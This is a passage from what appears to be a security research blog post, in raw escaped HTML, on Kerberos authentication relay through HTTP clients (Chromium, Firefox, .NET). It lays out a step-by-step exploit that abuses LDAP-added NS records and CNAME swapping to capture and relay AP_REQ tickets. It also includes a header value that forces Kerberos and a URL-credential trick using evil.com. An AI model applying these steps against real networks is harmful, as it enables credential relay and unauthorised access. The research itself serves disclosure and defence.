class=\"c4\"&gt;WINHTTP_OPTION_AUTOLOGON_POLICY&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;policy.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;At least as used with WebDAV WinHTTP handles a &lt;/span&gt;&lt;span class=\"c4\"&gt;WWW-Authenticate&lt;/span&gt;&lt;span&gt;&amp;nbsp;header of &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;, however it ends up using the &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;package regardless and so Integrity will always be enabled. It also enables Kerberos delegation automatically like WinINET.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.pjg6jrw6yjqn\"&gt;&lt;span class=\"c31\"&gt;Chromium M93&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Chromium based browsers such as Chrome and Edge are open source so it&amp;#39;s a bit easier to check the implementation. By default Chromium will automatically authenticate to intranet zone sites, it uses the same Internet Security Manager used by WinINET to make the zone determination in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://source.chromium.org/chromium/chromium/src/+/main:net/http/url_security_manager_win.cc;drc=739ccc21289257112c667e04a40d9a5a2db466bf;l=50\"&gt;URLSecurityManagerWin::CanUseDefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. An administrator can set GPOs to change this behavior to only allow automatic authentication to a set of hosts.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The SPN is generated in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=78c0778431c6fdd3dead532b1774270486829251;l=248\"&gt;HttpAuthHandlerNegotiate::CreateSPN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is called from &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=a412d0ef42cd54ca75e76023a8ccf13d6f58bf06;l=356\"&gt;HttpAuthHandlerNegotiate::DoResolveCanonicalNameComplete&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. While the documentation for &lt;/span&gt;&lt;span class=\"c4\"&gt;CreateSPN &lt;/span&gt;&lt;span class=\"c3\"&gt;mentions it&amp;#39;s basically a copy of the behavior in IE, it technically isn&amp;#39;t. Instead of taking the canonical name from the initial DNS request it does a second DNS request, and the result of that is used to generate the SPN. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;This second DNS request is important as it means that we now have a way of exploiting this from a public DNS name. If you set the TTL of the initial host DNS record to a very low value, then it&amp;#39;s possible to change the DNS response between the lookup for the host to connect to and the lookup for the canonical name to use for the SPN. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;This will also work with local DNS resolution as well, though in that case the response doesn&amp;#39;t need to be switched as one response is sufficient. This second DNS lookup behavior can be disabled with a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://admx.help/?Category=Chrome&amp;Policy=Google.Policies.Chrome::DisableAuthNegotiateCnameLookup\"&gt;GPO&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. If this is disabled then neither local DNS resolution nor public DNS will work as Chromium will use the host specified in the URL for the SPN.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;In a domain environment where the Chromium browser is configured to only authenticate to Intranet sites we can abuse the fact that by default authenticated users can add new DNS records to the Microsoft DNS server through LDAP (see &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/\"&gt;this blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;by &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://twitter.com/kevin_robertson\"&gt;Kevin Robertson&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;). Using the domain&amp;#39;s DNS server is useful as the DNS record could be looked up using a short Intranet name rather than a public DNS name meaning it&amp;#39;s likely to be considered a target for automatic authentication.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One problem with using LDAP to add the DNS record is the time before the DNS server will refresh its records is at least 180 seconds. This would make it difficult to switch the response from a normal address record to a CNAME record in a short enough time frame to be useful. Instead we can add an NS record to the DNS server which forwards the lookup to our own DNS server. As long as the TTL for the DNS response is short the domain&amp;#39;s DNS server will rerequest the record and we can return different responses without any waiting for the DNS server to update from LDAP. This is very similar to &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://en.wikipedia.org/wiki/DNS_rebinding\"&gt;DNS rebinding attack&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;, except instead of swapping the IP address, we&amp;#39;re swapping the canonical name.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c25 c14 c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898\" border=\"0\" alt=\"Diagram of two DNS request attack against Chromium\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c25 c14 c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Therefore a working exploit as shown in the diagram would be the following:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c24 lst-kix_wkcrlfh2qk3l-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;Register an NS record with the DNS server for &lt;/span&gt;&lt;span class=\"c4\"&gt;evilhost.domain.com&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;using existing authenticated credentials via LDAP. Wait for the DNS server to pick up the record.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;Direct the browser to connect to &lt;/span&gt;&lt;span class=\"c4\"&gt;http://evilhost&lt;/span&gt;&lt;span&gt;. T&lt;/span&gt;&lt;span&gt;his allows Chromium to automatically authenticate as it&amp;#39;s an undotted Intranet host. The browser will lookup &lt;/span&gt;&lt;span class=\"c4\"&gt;evilhost.domain.com&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;by adding its primary DNS suffix. &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;This request goes to the client&amp;#39;s DNS server, which then follows the NS record and performs a recursive query to the attacker&amp;#39;s DNS server. &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The attacker&amp;#39;s DNS server returns a normal address record for their HTTP server with a very short TTL.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The browser makes a request to the HTTP server, at this point the attacker delays the response long enough for the cached DNS request to expire. It can then return a 401 to get the browser to authenticate.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The browser makes a second DNS lookup for the canonical name. As the original request has expired, another will be made for &lt;/span&gt;&lt;span class=\"c4\"&gt;evilhost.domain.com&lt;/span&gt;&lt;span&gt;. For this lookup the attacker returns a CNAME record for the &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;target. The client&amp;#39;s DNS server will look up the IP address for the CNAME host and return that.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The browser will generate the SPN based on the CNAME record and that&amp;#39;ll be used to generate the AP_REQ, sending it to the attacker&amp;#39;s HTTP server.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The attacker can relay the AP_REQ to the target server.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;It&amp;#39;s possible that we can combine the local and public DNS attack mechanisms to only need one DNS request. In this case we could set up an NS record to our own DNS server and get the client to resolve the hostname. The client&amp;#39;s DNS server would do a recursive query, and at this point our DNS server shouldn&amp;#39;t respond immediately. We could then start a classic DNS spoofing attack to return a DNS response packet directly to the client with the spoofed address record.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;In general DNS spoofing is limited by requiring the source IP address, transaction ID and the UDP source port to match before the DNS client will accept the response packet. The source IP address should be spoofable on a local network and the client&amp;#39;s IP address can be known ahead of time through an initial HTTP connection, so the only problems are the transaction ID and port.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;As most clients have a relatively long timeout of 3-5 seconds, that might be enough time to try the majority of the combinations for the ID and port. Of course there isn&amp;#39;t really a penalty for trying multiple times. If this attack was practical then you could do the attack on a local network even if local DNS resolution was disabled and enable the attack for libraries which only do a single lookup such as WinINET and WinHTTP. The response could have a long TTL, so that when the access is successful it doesn&amp;#39;t need to be repeated for every request.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;I couldn&amp;#39;t get Chromium to downgrade &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;to &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;only so Integrity will be enabled. Also since Delegation is not enabled by default, an administrator needs to configure an &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://admx.help/?Category=Chrome&amp;Policy=Google.Policies.Chrome::AuthNegotiateDelegateWhitelist\"&gt;allow list GPO&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;to specify what targets are allowed to receive delegated credentials.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;A bonus quirk for Chromium: It seems to be the only browser which still supports URL based user credentials. If you pass user credentials in the request and get the server to return a request for &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication then it&amp;#39;ll authenticate automatically regardless of the zone of the site. You can also pass credentials using &lt;/span&gt;&lt;span class=\"c4\"&gt;XMLHttpRequest::open&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;While not very practical, this can be used to test a user&amp;#39;s password from an arbitrary host. If the username/password is correct and the SPN is spoofed then Chromium will send a validated Kerberos AP_REQ, otherwise either NTLM or no authentication will be sent. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;NTLM can be always generated as it doesn&amp;#39;t require any proof the password is valid, whereas Kerberos requires the password to be correct to allow the authentication to succeed. You need to specify the domain name when authenticating so you use a URL of the form &lt;/span&gt;&lt;span class=\"c25 c14 c4\"&gt;http://DOMAIN%5CUSER:PASSWORD@host.com.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One other quirk of this is you can specify a fully qualified domain name (FQDN) and user name and the Windows Kerberos implementation will try and authenticate using that server based on the DNS SRV records. For example &lt;/span&gt;&lt;span class=\"c4\"&gt;http://EVIL.COM%5CUSER:PASSWORD@host.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;will try to authenticate to the Kerberos service specified through the &lt;/span&gt;&lt;span class=\"c4\"&gt;_kerberos._tcp.evil.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;SRV record&lt;/span&gt;&lt;span class=\"c3\"&gt;. This trick works even on non-domain joined systems to generate Kerberos authentication, however it&amp;#39;s not clear if this trick has any practical use.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It&amp;#39;s worth noting that I did discuss the implications of the Chromium HTTP vector with team members internally and the general conclusion that this behavior is by design as it&amp;#39;s trying to copy the behavior expected of existing user agents such as IE.&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;Therefore there was no expectation it would be fixed.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.xfgb3dttm6vh\"&gt;&lt;span class=\"c31\"&gt;Firefox 91&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;As with Chromium, Firefox is open source so we can find the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://searchfox.org/mozilla-central/source/extensions/auth/nsHttpNegotiateAuth.cpp#170\"&gt;implementation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Unlike the other HTTP implementations researched up to this point, Firefox doesn&amp;#39;t perform Windows authentication by default. An administrator needs to configure either a list of hosts that are allowed to automatically authenticate, or the &lt;/span&gt;&lt;span class=\"c4\"&gt;network.negotiate-auth.allow-non-fqdn&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;setting can be enabled to authenticate to non-dotted host names.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;If authentication is enabled it works with both local DNS resolving and public DNS as it does a second DNS lookup when constructing the SPN for &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://searchfox.org/mozilla-central/source/extensions/auth/nsAuthSSPI.cpp#93\"&gt;nsAuthSSPI::MakeSN&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. Unlike Chromium there doesn&amp;#39;t seem to be a setting to disable this behavior.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Once again I couldn&amp;#39;t get Firefox to use raw Kerberos, so Integrity is enabled. Also Delegation is not enabled unless an administrator configures the &lt;/span&gt;&lt;span class=\"c4\"&gt;network.negotiate-auth.delegation-uris&lt;/span&gt;&lt;span&gt;&amp;nbsp;setting.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.hj80sqr0xa9u\"&gt;&lt;span class=\"c31\"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The .NET Framework 4.8 officially has two HTTP libraries, the original &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest\"&gt;System.Net.HttpWebRequest&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and derived APIs and the newer &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient\"&gt;System.Net.Http.HttpClient&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;API. However in the .NET framework the newer API uses the older one under the hood, so we&amp;#39;ll only consider the older of the two.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Windows authentication is only generated automatically if the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest.usedefaultcredentials\"&gt;UseDefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;property is set to true on the &lt;/span&gt;&lt;span class=\"c4\"&gt;HttpWebRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;object as shown below &lt;/span&gt;&lt;span&gt;(technically this sets the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials\"&gt;CredentialCache.DefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;object, but it&amp;#39;s easier to use the boolean property). Once the default credentials are set the client will automatically authenticate using Windows authentication to any host, it doesn&amp;#39;t seem to care if that host is in the Intranet zone.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7e4822d1f02afd7da5d70f6bb7cc98084373024a\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;request = WebRequest.CreateHttp(&lt;/span&gt;&lt;span class=\"c2 c36\"&gt;&amp;quot;http://www.evil.com&amp;quot;&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;request.UseDefaultCredentials = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;true&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;response = (HttpWebResponse)request.GetResponse();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The SPN is generated in the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://referencesource.microsoft.com/#System/net/System/Net/_AuthenticationState.cs,114\"&gt;System.Net.AuthenticationState.GetComputeSpn&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function which we can find in the .NET reference source. The SPN is built from the canonical name returned by the initial DNS lookup, which means it supports the local but not public DNS resolution. If you follow the code it does support doing a second DNS lookup if the host is undotted, however this is only if the client code sets an explicit &lt;/span&gt;&lt;span class=\"c4\"&gt;Host &lt;/span&gt;&lt;span class=\"c3\"&gt;header as far as I can tell. Note that the code here is slightly different in .NET 2.0 which might support looking up the canonical name as long as the host name is undotted, but I&amp;#39;ve not verified that.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The .NET Framework supports specifying &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;directly as the authentication type in the &lt;/span&gt;&lt;span class=\"c4\"&gt;WWW-Authentication&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;header. As the client code doesn&amp;#39;t explicitly request integrity, this allows the Kerberos AP_REQ to not have Integrity enabled. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The code also supports the &lt;/span&gt;&lt;span class=\"c4\"&gt;WWW-Authentication&lt;/span&gt;&lt;span&gt;&amp;nbsp;header having an initial token, so even if Kerberos wasn&amp;#39;t directly supported, you could use &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and specify the stub token I described at the start to force Kerberos authentication. For example returning the following header with the initial 401 status response will force &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos &lt;/span&gt;&lt;span class=\"c3\"&gt;through auto-detection:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.47f2d775b3f960ad13600d96e3bddd754ab896ed\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;WWW-Authenticate: Negotiate AAFA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Finally, the authentication code always enables delegation regardless of the target host.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.55txgo3a2wq5\"&gt;&lt;span class=\"c31\"&gt;.NET 5.0&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The .NET 5.0 runtime has deprecated the &lt;/span&gt;&lt;span class=\"c4\"&gt;HttpWebRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;API in favor of the &lt;/span&gt;&lt;span class=\"c4\"&gt;HttpClient&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. It uses a new backend class called the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.net.http.socketshttphandler\"&gt;SocketsHttpHandler&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. As it&amp;#39;s all open source we can find the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/dotnet/runtime/blob/791a0d896052f61161aff4c1ccb5f3425328f9a8/src/libraries/System.Net.Http/src/System/Net/Http/SocketsHttpHandler/AuthenticationHelper.NtAuth.cs\"&gt;implementation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, specifically the &lt;/span&gt;&lt;span class=\"c4\"&gt;AuthenticationHelper &lt;/span&gt;&lt;span class=\"c3\"&gt;class which is a complete rewrite from the .NET Framework version.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;To automatically authenticate, the client code must either use the &lt;/span&gt;&lt;span class=\"c4\"&gt;HttpClientHandler &lt;/span&gt;&lt;span&gt;class and set the &lt;/span&gt;&lt;span class=\"c4\"&gt;UseDefaultCredentials &lt;/span&gt;&lt;span&gt;property as shown below. Or if using &lt;/span&gt;&lt;span class=\"c4\"&gt;SocketsHttpHandler&lt;/span&gt;&lt;span&gt;, set the &lt;/span&gt;&lt;span class=\"c4\"&gt;Credentials &lt;/span&gt;&lt;span&gt;property to the default credentials. This handler must then be specified when creating the &lt;/span&gt;&lt;span class=\"c4\"&gt;HttpClient &lt;/span&gt;&lt;span class=\"c3\"&gt;object.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.558674b491818f584c342a8a8dd3989575c4c999\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;handler = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;HttpClientHandler();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;handler.UseDefaultCredentials = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;true&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;client = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;HttpClient(handler);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;await&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;client.GetStringAsync(&lt;/span&gt;&lt;span class=\"c2 c36\"&gt;&amp;quot;http://www.evil.com&amp;quot;&lt;/span&gt;&lt;span class=\"c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Unless the client specified an explicit &lt;/span&gt;&lt;span class=\"c4\"&gt;Host &lt;/span&gt;&lt;span class=\"c3\"&gt;header in the request the authentication will do a DNS lookup for the canonical name. This is separate from the DNS lookup for the HTTP connection so it supports both local and public DNS attacks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;While the implementation doesn&amp;#39;t support 